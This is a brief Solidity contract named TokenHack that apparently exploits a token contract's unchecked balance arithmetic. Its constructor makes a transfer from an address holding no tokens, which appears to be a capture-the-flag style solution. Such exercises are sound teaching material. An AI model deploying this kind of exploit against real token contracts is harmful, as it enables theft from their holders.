// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract TokenHack {
    IToken private immutable TARGET;

    constructor(address _target) {
        TARGET = IToken(_target);
        TARGET.transfer(msg.sender, 1);
    }
}
